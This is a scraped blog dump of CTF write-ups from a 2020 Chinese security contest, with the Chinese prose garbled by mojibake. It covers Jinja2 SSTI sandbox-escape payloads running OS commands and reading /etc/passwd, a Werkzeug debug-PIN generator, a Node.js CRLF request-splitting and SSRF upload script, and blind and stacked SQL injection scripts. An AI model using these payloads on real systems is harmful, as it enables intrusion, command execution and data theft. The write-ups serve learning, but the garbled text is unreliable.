1getattr(getattr(getattr(getattr(getattr(&#39;&#39;,dir(0)[0][0]*2+&#39;class&#39;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#39;mro&#39;+dir(0)[0][0]*2)[-1],dir(0)[0][0]*2+&#39;subclasses&#39;+dir(0)[0][0]*2)()[127],dir(0)[0][0]*2+&#39;init&#39;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#39;globals&#39;+dir(0)[0][0]*2)[&#39;system&#39;](&#39;ls&#39;) èµ›åçœ‹åˆ°ä¸‹é¢ä¸¤ä¸ªpayload payload1ï¼Œåˆ©ç”¨è½¬ä¹‰å­—ç¬¦ï¼ˆ16è¿›åˆ¶ï¼‰ http://python-ds.com/python-3-escape-sequences 1&#123;&#123;&quot;&quot;[&quot;\\x5f\\x5fclass\\x5f\\x5f&quot;][&quot;\\x5f\\x5fmro\\x5f\\x5f&quot;][1][&quot;\\x5f\\x5fsubclasses\\x5f\\x5f&quot;]()[30][&quot;\\x5f\\x5finit\\x5f\\x5f&quot;][&quot;\\x5f\\x5fglobals\\x5f\\x5f&quot;][&quot;\\x5f\\x5fbuiltins\\x5f\\x5f&quot;][&#39;\\x5f\\x5fimport\\x5f\\x5f&#39;](&#39;os&#39;)[&quot;popen&quot;](&#39;cat%20&#x2F;flag*&#39;)[&#39;read&#39;]()&#125;&#125; payload2ï¼Œåˆ©ç”¨request 1&#123;&#123;()|attr(request[&#39;args&#39;][&#39;x1&#39;])|attr(request[&#39;args&#39;][&#39;x2&#39;])|attr(request[&#39;args&#39;][&#39;x3&#39;])()|attr(request[&#39;args&#39;][&#39;x4&#39;])(233)|attr(request[&#39;args&#39;][&#39;x5&#39;])|attr(request[&#39;args&#39;][&#39;x6&#39;])|attr(request[&#39;args&#39;][&#39;x4&#39;])(request[&#39;args&#39;][&#39;x7&#39;])|attr(request[&#39;args&#39;][&#39;x4&#39;])(request[&#39;args&#39;][&#39;x8&#39;])(request[&#39;args&#39;][&#39;x9&#39;])&#125;&#125;?x1&#x3D;__class__&amp;x2&#x3D;__base__&amp;x3&#x3D;__subclasses__&amp;x4&#x3D;__getitem__&amp;x5&#x3D;__init__&amp;x6&#x3D;__globals__&amp;x7&#x3D;__builtins__&amp;x8&#x3D;eval&amp;x9&#x3D;__import__(&quot;os&quot;).popen(&#39;æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤&#39;).read() è¿™é‡Œçªç„¶æ„è¯†åˆ°æ–‡ç« å‰é¢éƒ½æ²¡æœ‰æåˆ°è¿‡æ»¤å™¨ï¼Œè€Œåœ¨æ¨¡ç‰ˆå¼•æ“ä¸­è¿‡æ»¤å™¨ä¹Ÿæœ‰å¾ˆå¤šszs 12345#æ¯”å¦‚flagè¢«è¿‡æ»¤ï¼Œ|reverse&#39;&#39;.__class__.__mro__[-1].__subclasses__()[40](&#39;galf&#39;|reverse).read()#æ¯”å¦‚getattrè¢«è¿‡æ»¤ï¼Œ|attr(&#39;&#39;|attr(&#39;__class__&#39;)).__mro__[-1].__subclasses__()[127].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)#names|lastï¼Œå–åºåˆ—æœ€åä¸€ä¸ªå…ƒç´ ç­‰ç­‰ =======================åˆ†å‰²çº¿ æœ‰æ—¶å€™åç«¯ä»£ç è¿‡æ»¤ä»£ç å¯èƒ½æ˜¯è¿™æ ·çš„ open (&#39;&#39;) =======================åˆ†å‰²çº¿ åˆé€›åˆ°ä¸€ç¯‡bypassçš„æ–‡ç«  ä»SSTIåˆ°æ²™ç®±é€ƒé€¸-jinja2 éœ€è¦è·å–çš„å†…å®¹åœ¨ config ä¸­ï¼Œä¸èƒ½ä½¿ç”¨(ã€)ã€selfã€config å¯ç”¨çš„ä¸Šä¸‹æ–‡å˜é‡/å‡½æ•°å¦‚ä¸‹url_for, g, request, namespace, lipsum, range, session, dict, get_flashed_messages, cycler, joiner, config åŒæ—¶åˆ©ç”¨ä¸Šä¸‹æ–‡è·å– config æ–¹å¼å¦‚ä¸‹ 1__globals__[&#39;current_app&#39;].config&#96; &#x2F; &#96;top.app.config 12url_for.__globals__[&#39;current_app&#39;].configget_flashed_messages.__globals__[&#39;current_app&#39;].config ============================åˆ†å‰²çº¿ ä¸€æŠŠæ¢­ï¼š https://github.com/epinna/tplmap ============================åˆ†å‰²çº¿ ä¹‹å‰è¯´å‘½ä»¤æ‰§è¡Œæ²¡å›æ˜¾æ˜¯å› ä¸ºè°ƒç”¨systemçš„åŸå› ï¼Œå¯ä»¥è°ƒç”¨popen() ä¸¾ä¾‹ 1&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;&lt;command&gt;&#39;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; å‚è€ƒé“¾æ¥ http://n3k0.icu/2018/09/10/Python-Sandbox-Excape/ https://lihuaiqiu.github.io/2019/07/07/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-Jinja2/#more","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://glotozz.github.io/tags/ctf/"}]},{"title":"2020æ–°æ˜¥æˆ˜ç–«-ç½‘ç»œå®‰å…¨å…¬ç›Šèµ›-3","slug":"2020æ–°æ˜¥æˆ˜ç–«-ç½‘ç»œå®‰å…¨å…¬ç›Šèµ›-3","date":"2020-02-23T02:38:33.000Z","updated":"2020-02-27T10:45:48.427Z","comments":true,"path":"2020/02/23/2020æ–°æ˜¥æˆ˜ç–«-ç½‘ç»œå®‰å…¨å…¬ç›Šèµ›-3/","link":"","permalink":"https://glotozz.github.io/2020/02/23/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-3/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• Flaskapp node_game ezExpress easy_thinking Flaskapphintä¸­æç¤ºPINï¼Œé‚£ä¹ˆä¼°è®¡åˆ©ç”¨debug https://xz.aliyun.com/t/2553?tdsourcetag=s_pctim_aiomsg /debugå¾—åˆ°æºç  è¯»å–é…ç½®åˆ©ç”¨è‡ªå¸¦çš„/encodeï¼Œç„¶åä¼ å…¥/decode 1&lt;Config &#123;&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: True, &#39;TESTING&#39;: False, &#39;PROPAGATE_EXCEPTIONS&#39;: None, &#39;PRESERVE_CONTEXT_ON_EXCEPTION&#39;: None, &#39;SECRET_KEY&#39;: &#39;s_e_c_r_e_t_k_e_y&#39;, &#39;PERMANENT_SESSION_LIFETIME&#39;: datetime.timedelta(days&#x3D;31), &#39;USE_X_SENDFILE&#39;: False, &#39;SERVER_NAME&#39;: None, &#39;APPLICATION_ROOT&#39;: &#39;&#x2F;&#39;, &#39;SESSION_COOKIE_NAME&#39;: &#39;session&#39;, &#39;SESSION_COOKIE_DOMAIN&#39;: False, &#39;SESSION_COOKIE_PATH&#39;: None, &#39;SESSION_COOKIE_HTTPONLY&#39;: True, &#39;SESSION_COOKIE_SECURE&#39;: False, &#39;SESSION_COOKIE_SAMESITE&#39;: None, &#39;SESSION_REFRESH_EACH_REQUEST&#39;: True, &#39;MAX_CONTENT_LENGTH&#39;: None, &#39;SEND_FILE_MAX_AGE_DEFAULT&#39;: datetime.timedelta(seconds&#x3D;43200), &#39;TRAP_BAD_REQUEST_ERRORS&#39;: None, &#39;TRAP_HTTP_EXCEPTIONS&#39;: False, &#39;EXPLAIN_TEMPLATE_LOADING&#39;: False, &#39;PREFERRED_URL_SCHEME&#39;: &#39;http&#39;, &#39;JSON_AS_ASCII&#39;: True, &#39;JSON_SORT_KEYS&#39;: True, &#39;JSONIFY_PRETTYPRINT_REGULAR&#39;: False, &#39;JSONIFY_MIMETYPE&#39;: &#39;application&#x2F;json&#39;, &#39;TEMPLATES_AUTO_RELOAD&#39;: None, &#39;MAX_COOKIE_SIZE&#39;: 4093, &#39;BOOTSTRAP_USE_MINIFIED&#39;: True, &#39;BOOTSTRAP_CDN_FORCE_SSL&#39;: False, &#39;BOOTSTRAP_QUERYSTRING_REVVING&#39;: True, &#39;BOOTSTRAP_SERVE_LOCAL&#39;: False, &#39;BOOTSTRAP_LOCAL_SUBDOMAIN&#39;: None&#125;&gt; è¿˜æ˜¯å¾—ç”ŸæˆPINï¼Œéœ€è¦è¯»å–ä¸€äº›é…ç½®æ–‡ä»¶ https://www.cnblogs.com/-qing-/p/11656544.html#_label2 payload æ–‡ä»¶è¯»å– 1&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#125;&#125; å‘½ä»¤æ‰§è¡Œ 123&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(&#39;__global&#39;+&#39;s__&#39;)[&#39;os&#39;].__dict__[&#39;system&#39;](&#39;ls&#39;)&#125;&#125; éƒ½è¢«waf æŸ¥çœ‹ç½‘å¡ 1&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address&#39;).read()&#125;&#125; å¾—åˆ°02:42:ac:12:00:02=&gt;2485377957890 åœ¨dockerä¸­ï¼ŒæŸ¥çœ‹æœºå™¨ç  1&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;&#x2F;proc&#x2F;self&#x2F;cgroup&#39;).read()&#125;&#125; c87691dcb0dbd614f719b6a06e7b60484b5a760147a8f5332511356483a20df4 1234567891011probably_public_bits = [ 'flaskweb', # username 'flask.app', # modname 'Flask', # getattr(app, '__name__', getattr(app.__class__, '__name__')) '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),]private_bits = [ '2485377957890',# str(uuid.getnode()), /sys/class/net/ens33/address 'c87691dcb0dbd614f719b6a06e7b60484b5a760147a8f5332511356483a20df4'# get_machine_id(), /etc/machine-id] 1234567891011121314151617181920212223242526272829303132333435363738394041import hashlibfrom itertools import chainprobably_public_bits = [ 'flaskweb', # username 'flask.app', # modname 'Flask', # getattr(app, '__name__', getattr(app.__class__, '__name__')) '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),]private_bits = [ '2485377957890',# str(uuid.getnode()), /sys/class/net/ens33/address 'c13c64207f09e3ab65ae5495988d6880e7068f245add3303fd80303ad9fce46f'# get_machine_id(), /etc/machine-id]h = hashlib.md5()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit)h.update(b'cookiesalt')cookie_name = '__wzd' + h.hexdigest()[:20]num = Noneif num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = numprint(rv) 1os.popen(&#39;ls &#x2F;&#39;).read() ç¿”å“¥çš„æ–¹æ³•ï¼šç›´æ¥ç»•wafå‘½ä»¤æ‰§è¡Œ 1&#123;&#123;[].__class__.__base__.__subclasses__()[127].__init__.__globals__[&#39;sys&#39;+&#39;tem&#39;](&#39;ls &#x2F;&#39;)&#125;&#125; æ²¡æœ‰å›æ˜¾ï¼Œåå¼¹shellå³å¯ node_game https://r3billions.com/writeup-split-second/?tdsourcetag=s_pctim_aiomsg 1%C4%A0HTTP%2F1.1%C4%8D%C4%8AHost%3A%C4%A0127.0.0.1%C4%8D%C4%8A%C4%8D%C4%8AGET%C4%A0%2Ffile_upload æœ¬åœ°æµ‹ä¸€ä¸‹ 123456#ä½¿ç”¨npm å®‰è£…ä¸€ä¸ªæ¨¡å— n åˆ°å…¨å±€npm install -g n#ä½¿ç”¨ n åŠ ç‰ˆæœ¬å·å°±å¯ä»¥å®‰è£…å…¶ä»–ç‰ˆæœ¬n 8.12.0#å†ä½¿ç”¨ n ï¼Œé€šè¿‡ä¸Šä¸‹é”®ï¼Œå°±å¯ä»¥é€‰æ‹©ä¸åŒçš„ç‰ˆæœ¬n wiresharké‡Œé¢æ˜¯è¿™æ ·çš„ ä¹Ÿå°±æ˜¯è¯´payloadæœ‰é—®é¢˜ï¼Œå¹¶æ²¡æœ‰å®ç°CRLFæ³¨å…¥ï¼Œä½†æ˜¯ä¸çŸ¥é“å“ªæœ‰é—®é¢˜ã€‚ã€‚ Expressæ–‡ä»¶ä¸Šä¼ ï¼ŒæŸ¥çœ‹å‚æ•°å†…å®¹ï¼Œç­‰ä¸‹æ„é€ åŒ…çš„æ—¶å€™æ–¹ä¾¿äº› 123var file_path &#x3D; &#39;&#x2F;uploads&#x2F;&#39; + req.files[0].mimetype +&quot;&#x2F;&quot;;var file_name &#x3D; req.files[0].originalnamevar dir_file &#x3D; __dirname + file_path + file_name ä½œç½¢ ======================åˆ†å‰²çº¿ èµµå¸ˆå‚…å‘äº†è„šæœ¬ï¼ŒCRLFçš„ç¼–ç å’Œwpä¸å¤ªä¸€æ · åŸç†ï¼š https://xz.aliyun.com/t/2894 åœ¨nodejs8.12.0è¿™ä¸ªç‰ˆæœ¬ä¸­, ç¨‹åºåœ¨åº•å±‚å¤„ç†çš„æ—¶å€™ä¼šèˆå¼ƒé«˜ä½çš„å­—ç¬¦, åªä¿ç•™ä½ä½çš„å­—ç¬¦, ä¹Ÿå°±æ˜¯è¯´ å‡å¦‚æˆ‘ä»¬ä¼ å…¥chr(0xffa0)å¤„ç†åä¼šè¢«æˆªæ–­ä¸ºchr(0xa0)ï¼Œå¹¶ä¸”è¿™ä¸ª0xffå¯æ›´æ¢ æµ‹è¯•CRLF 1234567891011121314import urllibimport requestspayload = ''' HTTP/1.1Host: xConnection: keep-aliveGET /file_upload HTTP/1.1Host: xConnection: closex:'''payload = payload.replace(\"\\n\", \"\\r\\n\")a = ''.join(chr(int('0xff' + hex(ord(c))[2:].zfill(2), 16))for c in payload)a = urllib.parse.quote(a)print(a) ä½†æ˜¯æ‰“é¢˜ç›®å’Œæœ¬åœ°è¿˜æ˜¯å¤±è´¥ï¼Œä¾æ—§æ˜¯304ï¼Œæˆ‘ä¸¢ï¼Œå†ç”¨è„šæœ¬å‘åŒ…å‘ç°å¯ä»¥ï¼ŒçŒœæµ‹åŸå› å¯èƒ½æ˜¯bpå‘é€GETè¯·æ±‚ä¸­æœ‰è¿™äº›éå¯è§å­—ç¬¦çš„æ—¶å€™å¯èƒ½ä¼šå‡ºé”™ è¿”å›200ï¼Œè¿”å›æºç  æ—¢ç„¶CSRFæ³¨å…¥æˆåŠŸï¼Œé…åˆSSRFä¸Šä¼ æ–‡ä»¶ ä¹‹å‰çœ‹æºç å‘ç°æˆ‘ä»¬å¯æ§æ–‡ä»¶è·¯å¾„ï¼Œä½†æ˜¯è¿˜éœ€è¦è®¿é—® 123456789app.get(&#39;&#x2F;&#39;, function(req, res) &#123; var action &#x3D; req.query.action?req.query.action:&quot;index&quot;; if( action.includes(&quot;&#x2F;&quot;) || action.includes(&quot;\\\\&quot;) )&#123; res.send(&quot;Errrrr, You have been Blocked&quot;); &#125; file &#x3D; path.join(__dirname + &#39;&#x2F;template&#x2F;&#39;+ action +&#39;.pug&#39;); var html &#x3D; pug.renderFile(file); res.send(html);&#125;); ä¸Šä¼ a.pugåˆ°/templateä¸‹å³å¯ pugè¯­æ³•ï¼š https://segmentfault.com/a/1190000006198621 12345doctype htmlhtml head body include ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag.txt ä¿®æ”¹æºç æŠŠipé™åˆ¶å»æ‰æŠ“åŒ… 123456789101112131415161718POST &#x2F;file_upload HTTP&#x2F;1.1Host: 192.168.56.124:8081User-Agent: x Content-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------2995119424827Connection: keep-aliveContent-Length: 269-----------------------------2995119424827Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;a.pug&quot;Content-Type: &#x2F;..&#x2F;templatedoctype htmlhtml head body include ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag.txt-----------------------------2995119424827-- ç»“åˆCRLF 123456789101112131415161718192021222324252627payload &#x3D; &#39;&#39;&#39; HTTP&#x2F;1.1Host: xConnection: keep-alivePOST &#x2F;file_upload HTTP&#x2F;1.1Host: 192.168.56.124:8081User-Agent: x Content-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------2995119424827Connection: keep-aliveContent-Length: 269-----------------------------2995119424827Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;a.pug&quot;Content-Type: &#x2F;..&#x2F;templatedoctype htmlhtml head body include ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag.txt-----------------------------2995119424827--GET &#x2F;file_upload HTTP&#x2F;1.1Host: xConnection: closex:&#39;&#39;&#39; æœ€åè®¿é—® è¿™é‡Œå‘åŒ…æ ¼å¼è¿˜æ˜¯æŒºç»†çš„ï¼Œå¯ä»¥é€šè¿‡wiresharkåˆ†ææ’æŸ¥ï¼Œæ¯”å¦‚ä¸€å¼€å§‹æˆ‘å‡ºç°è¿‡ä¸‹é¢çš„è§£æé”™è¯¯ ezExpressæ˜æ˜¾çš„JavaScriptåŸå‹é“¾æ±¡æŸ“ ç•™ä¸‹äº†ä¸å­¦æ— æœ¯çš„çœ¼æ³ª.jpg =================åˆ†å‰²çº¿ JavaScriptåŸå‹é“¾æ±¡æŸ“ï¼š https://glotozz.github.io/2020/02/25/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/ easy_thinkingåº”è¯¥æ˜¯tpæ¡†æ¶ï¼Œæç¤ºVulnerability Searchï¼Œå¯èƒ½æ˜¯æœç´¢åŠŸèƒ½æœ‰é—®é¢˜ äº§ç”ŸæŠ¥é”™ tp6.0ï¼Œåº”è¯¥ä¼šç»™æºç ï¼Œæ‰«äº†ä¸‹ï¼Œå‘ç°www.zip https://paper.seebug.org/1114/ çŒœæµ‹æ˜¯æœç´¢è®°å½•æ˜¯dataï¼Œsessionidæ˜¯æ–‡ä»¶åï¼Œæƒ³æœ¬åœ°æµ‹è¯•ä¸‹ï¼Œå‘ç°è¿è¡ŒæŠ¥é”™ [Sun Feb 23 06:18:54 2020] PHP Warning: require(/root/Desktop/web/public/vendor/autoload.php): failed to open stream: No such file or directory in /root/Desktop/web/public/index.php on line 6 å¯¹ç…§tp6æ–‡ä»¶ï¼Œå…ˆå°†index.phpç§»åˆ°publicä¸­ï¼Œå†ä¿®æ”¹ require __DIR__ . &#39;/../vendor/autoload.php&#39;; åˆæŠ¥é”™ æ¨¡æ¿æ–‡ä»¶ä¸å­˜åœ¨:public/static/tamplate/index\\index.html ä½†æ˜¯æ˜æ˜è·¯å¾„æ²¡é”™ï¼ŒæŸ¥çœ‹é…ç½® config/view.phpä¿®æ”¹view_dir_nameä¸ºpublic ä¿®æ”¹app/home/config/view.phpä¸ºstatic/tamplate/ æ€»ç®—èƒ½ç”¨äº†ã€‚ã€‚ åœ¨ç™»å½•çš„æ—¶å€™è®¾ç½®sessionçš„æ—¶å€™ä¿®æ”¹sessionidï¼Œåœ¨æŸ¥è¯¢çš„æ—¶å€™ç”¨è¿™ä¸ªsessionidå³å¯æ·»åŠ ä»»æ„å†…å®¹ ä½†æ˜¯è¿™æ ·è®¿é—®ä¸åˆ°ï¼Œéœ€è¦å†™å…¥app/home/controller/a.phpä¸‹ï¼Œ æ„é€ ../../../../app/home/controller/a.php é•¿åº¦37 ä¹Ÿæ²¡æœ‰æ–‡ä»¶åŒ…å«çš„åœ°æ–¹ã€‚ã€‚é‚ä½œç½¢ æ­£è§£å°±æ˜¯é¢˜ç›®ç¯å¢ƒç›´æ¥è®¿é—®å°±è¡Œã€‚ã€‚ å› ä¸ºæˆ‘æœ¬åœ°ä¿®æ”¹äº†ä¸€äº›é…ç½®å¯¼è‡´æ— æ³•è®¿é—®ã€‚ã€‚ä½†æ˜¯ä¸æ”¹è°ƒè¯•ä¸äº†ã€‚ã€‚ æœ€åè¿˜éœ€è¦bypassdisable_funcï¼Œéœ€è¦æ‰§è¡Œ/readflag è¿™ä¸ªåšè¿‡å‡ æ¬¡ï¼Œè¿‡æ»¤äº†å¾ˆå¤šï¼ŒåŒ…æ‹¬mail()ç­‰ https://github.com/mm0r1/exploits","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"2020æ–°æ˜¥æˆ˜ç–«-ç½‘ç»œå®‰å…¨å…¬ç›Šèµ›-2","slug":"2020æ–°æ˜¥æˆ˜ç–«-ç½‘ç»œå®‰å…¨å…¬ç›Šèµ›-2","date":"2020-02-22T14:56:52.000Z","updated":"2020-02-27T10:48:03.663Z","comments":true,"path":"2020/02/22/2020æ–°æ˜¥æˆ˜ç–«-ç½‘ç»œå®‰å…¨å…¬ç›Šèµ›-2/","link":"","permalink":"https://glotozz.github.io/2020/02/22/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-2/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• easysqli_copy blacklist Ezsqli æ”¾ä¸Šæˆ‘xxxxx easysqli_copyçœ‹åˆ°PDO+set names gbk å°±æƒ³åˆ°å®½å­—èŠ‚æ³¨å…¥ï¼Œä¹‹å‰çœ‹è¿‡çš„æ–‡ç«  ä»å®½å­—èŠ‚æ³¨å…¥è®¤è¯†PDOçš„åŸç†å’Œæ­£ç¡®ä½¿ç”¨ï¼šhttps://www.freebuf.com/articles/web/216336.html ç®€å•æµ‹è¯•äº†ä¸‹ï¼Œå‘ç°å¯ä»¥ï¼Œä½†æ˜¯è¿‡æ»¤äº†selectï¼Œæˆ‘ç®€å•æµ‹è¯•äº†ä¸‹å‘ç°å­˜åœ¨å †å æ³¨å…¥ï¼Œæ²¡æœ‰è¿‡æ»¤=ï¼Œä¸‡äº‹å¤§å‰ 1234select hex(&#39;select sleep(5)&#39;);set @a&#x3D;0x73656C65637420736C656570283529;prepare smtm_test from @a;execute smtm_test; 1?id&#x3D;1%df&#39;;set%20@a&#x3D;0x73656C65637420736C656570283529;prepare%20smtm_test%20from%20@a;execute%20smtm_test; è„šæœ¬ 12345678910111213141516171819202122232425262728293031323334353637383940#!/usr/bin/env python2# coding=utf-8import urllibimport requestsurl = \"http://d157325460674375820d1c51bd80f6adc9672fe83ab44e0e.changame.ichunqiu.com/?id=\"headers = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0',&#125;flag = \"\"tmp = 0for i in range(1, 100): if tmp == 1: break tmp = 1 for j in range(32, 127): # payload = \"select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())\" # payload = \"select(group_concat(column_name))from(information_schema.columns)where(table_name='table1')\" payload = \"select(group_concat(fllllll4g))from(table1)\" payload = \"select if(ascii(substr((&#123;&#125;),&#123;&#125;,1))=&#123;&#125;,sleep(3),1)\".format(payload, i, j) # print payload payload = payload.encode('hex') param = \"1\"+urllib.unquote(\"%df\")+\"';set @a=0x&#123;&#125;;prepare smtm_test from @a;execute smtm_test;\".format(payload) param = urllib.quote(param) # print(param) try: url1 = url + param r = requests.get(url=url1, timeout=3) if r.status_code != 200: j -= 1 continue # print(r.content.decode('utf-8')) except requests.exceptions.ReadTimeout as e: tmp = 0 flag = flag + chr(j) print(flag) breakprint(flag) blacklist1return preg_match(&quot;&#x2F;set|prepare|alter|rename|select|update|delete|drop|insert|where|\\.&#x2F;i&quot;,$inject); emmï¼Œè¿™ä¸ªé»‘åå•ä¼¼ä¹å¯ä»¥ç”¨æ˜¨å¤©çš„expæ‰“ã€‚ã€‚ã€‚ 1inject&#x3D;1&#39;and if(database() regexp&quot;^s&quot;,sleep(3),1)%23 éœ€è¦å…ˆåˆ©ç”¨å †å æ³¨å…¥æŸ¥è¯¢è¡¨å’Œå­—æ®µ 11&#39;;show tables;# å¾—åˆ°FlagHere 11&#39;; show columns from &#96;FlagHere&#96;; # å¾—åˆ°flag 1&#39;and if((FlagHere.flag regexp&#39;^{}&#39;),sleep(5),1)%23 è¿˜æœ‰ä¸ªé—®é¢˜ï¼Œå°±æ˜¯åˆ©ç”¨æ˜¨å¤©çš„æ–¹æ³•åªèƒ½æŸ¥å½“å‰è¡¨ï¼Œè€Œflagåœ¨å¦ä¸€å¼ è¡¨ä¸­ã€‚ é‚ä½œç½¢ https://www.4hou.com/posts/mM60 éªšæ“ä½œï¼šhandler 12345678910HANDLER tbl_name OPEN [ [AS] alias] HANDLER tbl_name READ index_name &#123; &#x3D; | &lt;&#x3D; | &gt;&#x3D; | &lt; | &gt; &#125; (value1,value2,...) [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125; [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name READ &#123; FIRST | NEXT &#125; [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name CLOSE 11&#39;;handler FlagHere open as a;handler a READ first;# å¾—åˆ°flag Ezsqlibpè·‘ä¸€ä¸‹sqlå­—å…¸ ä¸æ˜¯200å°±æ˜¯500,500çš„æ˜¯è¯­æ³•é”™è¯¯ï¼Œå…¶å®è¿‡æ»¤å­—ç¬¦çš„å¹¶ä¸å¤š æ•°å­—å‹ï¼Œæœ‰å›æ˜¾è€ƒè™‘ç›²æ³¨ï¼Œç®€å•æ„é€ äº†ä¸‹æˆäº† bpè·‘ä¸€ä¸‹å‘ç°cçš„æ—¶å€™Hello Nu1L æ•°æ®åº“ä¸ºctf,mysqlç‰ˆæœ¬ä¸º5.7.1 å‘ç°innodbä¹Ÿè¢«è¿‡æ»¤ã€‚ã€‚ èŠä¸€èŠbypass information_schemaï¼šhttps://www.anquanke.com/post/id/193512 å‰æè¦æ˜¯mysql â‰¥ 5.7ç‰ˆæœ¬ æ–°ç‰¹æ€§sys.schema_auto_increment_columnsä¹Ÿè¢«è¿‡æ»¤ã€‚ã€‚ 1select table_name from sys.schema_auto_increment_columns where table_schema&#x3D;&#39;ctf&#39; è¿˜æœ‰å¦ä¸€ç§ 1sys.schema_table_statistics_with_buffer 1select group_concat(table_name) from sys.x$schema_table_statistics_with_buffer æˆåŠŸå¾—åˆ°äº†è¡¨åusers233333333333333,f1ag_1s_h3r3_hhhhh, 1select * from f1ag_1s_h3r3_hhhhh æŠ¥500é”™è¯¯ï¼Œè¯´æ˜ä¸æ­¢1åˆ—ã€‚ã€‚ã€‚çŒœäº†å‡ ä¸ªå­—æ®µä¹Ÿä¸è¡Œ==ï¼æ— åˆ—åæ³¨å…¥å®åœ¨æä¸å‡ºæ¥ã€‚ã€‚ æ­£è§£ 1(select 1,0x61)&gt;(select * from f1ag_1s_h3r3_hhhhh limit 1) è„šæœ¬ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#!/usr/bin/env python2# coding=utf-8import requestss = requests.session()url = \"http://f1378e453faf447696702f67444c2575579c8764a54a4e37.changame.ichunqiu.com/\"headers = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0'&#125;cookies = &#123;&#125;data = &#123;&#125;flag = \"\"tmp = 0# for i in range(1, 100):# if tmp == 1:# break# tmp = 1# for j in range(32, 127):# # payload = \"select version()\"# payload = \"select group_concat(table_name) from sys.x$schema_table_statistics_with_buffer\"# param = \"0^(ascii(substr((&#123;&#125;),&#123;&#125;,1))=&#123;&#125;)#\".format(payload, str(i), str(j))# print(param)# data = &#123;# 'id': param# &#125;# r = requests.post(url=url, headers=headers, data=data)# # print(r.content.decode('utf-8'))# if \"Nu1L\" in r.content.decode(\"utf-8\"):# tmp = 0# flag = flag + chr(j)# print(flag)# break# print(flag)flag = ''for i in range(1,100): for j in range(32,127): # param = \"0^((select 1,0x&#123;&#125;)&gt;(select * from f1ag_1s_h3r3_hhhhh limit 1))#\".format((flag + chr(j)).encode('hex')) param = \"0^((select 1,concat('&#123;&#125;', CAST('0' as json)))&gt;(select * from f1ag_1s_h3r3_hhhhh limit 1))#\".format(flag + chr(j)) # print param data = &#123; 'id': param &#125; r = requests.post(url=url, headers=headers, data=data) if \"Nu1L\" in r.content.decode(\"utf-8\"): tmp = 0 flag = flag + chr(j-1) print(flag) break print(flag) æœ‰ä¸ªç¼ºé™·ï¼Œå°±æ˜¯ä¸åŒºåˆ†å¤§å°å†™ã€‚ã€‚ https://www.smi1e.top/%e6%96%b0%e6%98%a5%e6%88%98%e7%96%ab%e5%85%ac%e7%9b%8a%e8%b5%9b-ezsqli-%e5%87%ba%e9%a2%98%e5%b0%8f%e8%ae%b0/?tdsourcetag=s_pctim_aiomsg é¢„æœŸè§£æ˜¯æ–‡ç« ä¸­æåˆ°çš„ä½¿ç”¨ SELECT 